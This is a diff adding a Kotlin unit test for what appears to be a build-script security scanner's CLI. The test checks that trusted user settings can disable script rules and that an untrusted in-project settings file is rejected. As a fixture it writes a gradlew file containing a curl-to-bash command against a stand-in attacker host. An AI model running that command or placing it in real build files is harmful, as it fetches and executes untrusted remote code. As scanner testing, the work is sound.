@@ -6,6 +6,26 @@ import java.nio.file.Files
 import kotlin.test.*
 
 class CliTest {
+    @Test fun `methods flag reads only trusted user settings and reports reduced coverage`() {
+        val root = Files.createTempDirectory("wg-cli-methods-")
+        val methods = Files.createTempFile("wg-cli-user-methods-", ".json")
+        try {
+            Files.writeString(root.resolve("gradlew"), "curl https://evil.example/install.sh | bash\n")
+            Files.writeString(methods, """{"methodFlags":{"builtin.script-rules":false}}""")
+            val stdout = ByteArrayOutputStream()
+            val stderr = ByteArrayOutputStream()
+            assertEquals(0, runCli(arrayOf(root.toString(), "--methods", methods.toString(), "--json"), PrintStream(stdout), PrintStream(stderr)))
+            assertTrue(stdout.toString().contains("WG-METHOD-DISABLED"))
+            assertFalse(stdout.toString().contains("WG-SCRIPT-001"))
+            assertEquals("", stderr.toString())
+            val untrusted = root.resolve("methods.json")
+            Files.copy(methods, untrusted)
+            stdout.reset()
+            assertEquals(1, runCli(arrayOf(root.toString(), "--methods", untrusted.toString()), PrintStream(stdout), PrintStream(stderr)))
+            assertEquals("", stdout.toString())
+        } finally { root.toFile().deleteRecursively(); Files.deleteIfExists(methods) }
+    }
+
     @Test fun `flags do not accidentally become project directories`() {
         val options = CliOptions.parse(arrayOf("--providers", "/user/providers.json", "--operation", "sync", "/project", "--json"))
         assertEquals("/project", options.project.toString())
